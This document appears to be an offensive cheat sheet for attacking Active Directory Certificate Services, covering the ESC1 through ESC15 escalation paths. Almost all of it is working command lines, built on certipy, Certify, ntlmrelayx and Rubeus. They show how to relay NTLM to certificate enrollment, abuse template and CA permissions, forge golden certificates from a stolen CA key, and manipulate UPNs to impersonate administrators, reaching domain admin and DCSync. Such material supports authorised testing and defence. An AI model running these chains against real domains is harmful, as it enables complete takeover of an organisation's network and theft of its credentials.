# ADCS

## Enumeration >>> Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC
- `certutil -v -dsTemplate`
- `certify.exe find [ /vulnerable]`
- `certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>`
- `ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates`
- Get PKI objects information
  - `certify.exe pkiobjects`
- Display CA information
  - `certutil -TCAInfo`
  - `certify.exe cas`

## Web Enrollment Is Up >>> Domain admin
- ESC8 >>> Pass the ticket >>> DCSYNC || LDAP shell
  - `ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController`
    - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt`
    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>`
  - `certipy relay -target http://<ip_ca>`
    - `certipy auth -pfx <certificate> -dc-ip <dc_ip>`

## Misconfigured Certificate Template
- ESC1 >>> Pass the certificate
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>`
  - `certify.exe request /ca:<server>\<ca-name>   /template:"<vulnerable template name>" [/altname:"Admin"]`
- ESC2 >>> ESC3
- ESC3
  - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"`
    - `certify.exe request request /ca:<server>\<ca-name> /template:<template>  /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]`
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>`
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>`
- ESC13 >>> Pass The Certificate (PKINIT)
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>`
  - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"`
- ESC15
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]` >>> Pass the certificate (only Schannel)
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]` >>> Pass the certificate
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>`


## Misconfigured ACL
- ESC4
  - write privilege over a certificate template
    - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug` >>> ESC1
    - restore template
      - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json`

- ESC7
  - Manage CA
    - `certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>` >>> ESC7 Manage certificate
  - Manage certificate
    - `certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>`
      - `certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'`
        - error, but save private key and get issue request
    - Issue request
      - `certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>`
        - `certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>` >>> Pass the certificate

## Vulnerable PKI Object access control

- ESC5
  - Vulnerable acl on PKI >>> ACL
  - Golden certificate 
    - `certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>`
      - `certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>` >>> Pass the certificate

## Misconfigured Certificate Authority

- ESC6 @CVE@ >>> ESC1
  - Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication

- ESC11 >>> Pass the ticket >>> DCSYNC >>> Domain Admin
  - `ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>` 
    - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt`
    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>`
  - `certipy relay -target rpc://<ip_ca> -ca '<ca_name>'`
    - `certipy auth -pfx <certificate> -dc-ip <dc_ip>`

## Abuse Certificate Mapping

- ESC9/ESC10 (implicit)
  - `certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>`
    - ESC9/ESC10 (Case 1)
      - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator` >>> reset accountB UPN
        - ESC9
          - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>`
        - ESC10 (case 1)
          - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>`
    - ESC10 (Case 2)
      - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` >>> ESC10  Case1
  - reset accountB UPN
    - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` >>> Pass The Certificate
      - [Kerberos Mapping] ESC9/ESC10(Case 1)
      - [Schannel Mapping] ESC9/ESC10 (Case 2)

- ESC14 (explicit)
